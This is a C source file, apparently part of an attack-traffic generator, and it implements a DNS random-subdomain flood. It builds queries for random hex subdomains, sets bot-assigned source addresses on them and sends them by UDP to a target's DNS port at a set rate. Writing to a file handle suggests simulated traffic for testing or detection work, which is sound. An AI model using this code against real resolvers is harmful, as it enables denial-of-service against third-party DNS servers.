#include "attacks.h"

u64
unit_dns_randsub(FILE *f, u32 index)
{
	static const char hex[] = "0123456789abcdef";
	u8 src[4];
	u8 payload[256];
	char label[9];
	size_t len;
	int i;

	for (i = 0; i < 8; i++)
		label[i] = hex[rng_range(0, 15)];
	label[8] = '\0';

	bot_ip(index, src);
	if (g_atk.bots <= 1) {
		src[0] = 10;
		src[1] = 1;
		src[2] = 0;
		src[3] = 70;
	}
	len = build_dns_query(payload, (u16)rng_range(0, 65535), label);
	send_udp(f, src, g_atk.target, (u16)rng_range(1024, 65535), 53,
	    payload, (u16)len);
	return (1000000u / (g_atk.rate ? g_atk.rate : 1));
}
